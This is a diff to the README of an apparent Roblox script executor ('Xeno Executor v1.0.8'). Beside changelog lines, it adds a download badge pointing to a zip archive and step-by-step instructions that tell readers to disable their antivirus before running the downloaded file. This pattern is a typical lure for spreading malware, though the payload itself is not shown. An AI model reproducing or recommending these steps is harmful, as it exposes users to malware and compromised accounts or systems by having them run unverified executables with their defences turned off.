@@ -6,6 +6,18 @@ V1.0.8 Changelog
 📜 Better Dex script viewer (get rid of annoying '\t' character)
 🔧 Less 'requested module experienced an error while loading' and Roblox core scripts error
 
+[![Download](https://img.shields.io/badge/Download-XenoExecutor%20v1.0.8-blue)](https://github.com/drained420/Xeno-Executor-v1.0.8/releases/download/update/Xeno-v1.0.8-x64.zip)
+
+Instructions to Run the Program
+
+1. Disable Antivirus Software: Before running the application, please disable any antivirus software that may block it. This is necessary to ensure the program runs smoothly.
+
+2. Download the Application: Ensure you have downloaded the application file to your computer.
+
+3. Run the Application: Once the antivirus is disabled, locate the downloaded file and double-click it to start the installation or execution process.
+
+4. You Can Enable Antivirus Later: After you’ve finished using the program, you can enable your antivirus software again.
+
 ![image](https://github.com/user-attachments/assets/372d3eb8-1476-454f-9a06-0bc58f72c0a9)
 
 ![image](https://github.com/user-attachments/assets/e608bc6e-60f2-4326-a843-c9c77a641c59)
